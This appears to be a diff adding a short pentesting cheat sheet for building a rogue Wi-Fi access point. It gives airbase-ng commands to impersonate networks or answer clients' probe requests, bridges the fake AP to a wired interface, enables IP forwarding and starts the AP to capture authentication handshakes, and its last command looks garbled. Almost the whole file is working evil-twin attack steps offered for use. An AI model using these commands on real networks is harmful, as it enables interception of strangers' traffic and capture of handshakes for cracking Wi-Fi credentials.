@@ -1,0 +1,30 @@
+##SETTING UP AP
+	-airbase-ng -essid <NAME> -c 6 wlan0mon
+
+	#without specifying essid, airbase picks random essids from probe requests of clients
+	-airbase-ng -a <MAC> -c 6 -Z 4 wlan0mon == WPA2/CCMP
+	-airbase-ng -a <MAC> -c 6 -z 2 wlan0mon == WEP/TKIP
+
+#ENSURE BRIDGE-UTILS is installed
+	-apt install bridge-utils
+
+#Use different terminal to create a bridge(rogue) and link at0 to eth0 using bridge utilities
+	-brctl addbr rogue
+	-brctl addif rogue at0
+	-brctl addif rogue eth0
+
+#Because 2 interfaces are integrated into the virtual bridge, release their IP Addresses
+	-ifconfig at0 down
+	-ifconfig at0 0.0.0.0 up
+	-ifconfig eth0 down
+	-ifconfig eth0 0.0.0.0 up
+
+#ENABLE IP FORWARDING
+	-echo 1 > /proc/sys/net/ipv4/ip_forward
+
+#CONFIGURE BRIDGE WITH IP ADDRESS OF LAN where it connects to eth0
+	-ifconfig rogue 10.1.x.y netmask 255.255.255.0 broadcast 10.1.x.255 up
+	-route add default gw 10.1.x.1
+
+#START THE AP TO SNIFF auth handshakes
+	-airbase-ng -c 6 -e --ESSID /file_path/file.cap wlan0mon
